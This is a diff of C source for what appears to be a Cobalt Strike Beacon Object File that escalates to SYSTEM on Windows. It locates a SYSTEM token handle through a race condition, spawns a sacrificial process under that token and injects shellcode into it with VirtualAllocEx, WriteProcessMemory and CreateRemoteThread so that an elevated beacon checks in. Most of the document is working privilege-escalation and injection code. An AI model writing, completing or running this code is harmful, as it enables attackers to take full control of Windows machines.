@@ -1,35 +1,6 @@
 #include <windows.h>
 #include "beacon.h"
 
-// Beacon API declarations
-DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
-DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(VOID);
-DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
-DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$TerminateThread(HANDLE, DWORD);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
-DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
-DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
-DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
-DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
-DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
-DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
-DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
-DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
-DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$VirtualFreeEx(HANDLE, LPVOID, SIZE_T, DWORD);
-
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$CreateProcessWithLogonW(LPCWSTR, LPCWSTR, LPCWSTR, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$ConvertSidToStringSidW(PSID, LPWSTR*);
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$CreateProcessAsUserW(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
-
-DECLSPEC_IMPORT WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
-
 typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
     ULONG SystemInformationClass,
     PVOID SystemInformation,
@@ -57,7 +28,7 @@ typedef struct {
     LPWSTR lpCommandLine;
 } RACE_THREAD_DATA;
 
-// String comparison helper
+/* String comparison helper */
 int my_wcsstr(LPWSTR haystack, LPWSTR needle) {
     int i, j;
     for (i = 0; haystack[i] != L'\0'; i++) {
@@ -118,6 +89,7 @@ HANDLE FindSystemTokenHandle() {
     PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
     NTSTATUS status;
     HANDLE hHeap = KERNEL32$GetProcessHeap();
+    ULONG i;
 
     do {
         pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)KERNEL32$HeapAlloc(hHeap, 0, size);
@@ -136,7 +108,6 @@ HANDLE FindSystemTokenHandle() {
 
     HANDLE hToken = NULL;
     DWORD currentPid = KERNEL32$GetCurrentProcessId();
-    ULONG i;
 
     for (i = 0; i < pHandleInfo->NumberOfHandles; i++) {
         if (pHandleInfo->Handles[i].UniqueProcessId == currentPid &&
@@ -187,15 +158,12 @@ BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcod
     LPVOID pRemoteCode;
     SIZE_T bytesWritten;
     HANDLE hThread;
+    wchar_t target[] = L"C:\\Windows\\System32\\notepad.exe";
 
     MSVCRT$memset(&si, 0, sizeof(si));
     MSVCRT$memset(&pi, 0, sizeof(pi));
     si.cb = sizeof(si);
 
-    // Spawn a sacrificial process with SYSTEM token
-    // Using a legitimate Windows binary for OPSEC
-    wchar_t target[] = L"C:\\Windows\\System32\\dllhost.exe";
-    
     if (!ADVAPI32$CreateProcessAsUserW(
         hSystemToken,
         NULL,
@@ -215,7 +183,6 @@ BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcod
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned sacrificial process with PID: %d", pi.dwProcessId);
 
-    // Allocate memory in target process
     pRemoteCode = KERNEL32$VirtualAllocEx(
         pi.hProcess,
         NULL,
@@ -234,7 +201,6 @@ BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcod
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Allocated memory at 0x%p", pRemoteCode);
 
-    // Write shellcode to target process
     if (!KERNEL32$WriteProcessMemory(
         pi.hProcess,
         pRemoteCode,
@@ -252,7 +218,6 @@ BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcod
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Wrote %d bytes of shellcode", bytesWritten);
 
-    // Create remote thread to execute shellcode
     hThread = KERNEL32$CreateRemoteThread(
         pi.hProcess,
         NULL,
@@ -275,7 +240,6 @@ BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcod
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode injected successfully!");
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Your elevated beacon should check in shortly");
 
-    // Clean up handles
     KERNEL32$CloseHandle(hThread);
     KERNEL32$CloseHandle(pi.hProcess);
     KERNEL32$CloseHandle(pi.hThread);
@@ -307,7 +271,6 @@ void go(char* args, int len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Shellcode size: %d bytes", shellcodeLen);
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting race condition threads...");
 
-    // Use a dummy command for the race - we won't actually execute it
     threadData.lpCommandLine = L"C:\\Windows\\System32\\cmd.exe";
 
     for (i = 0; i < 5; i++) {
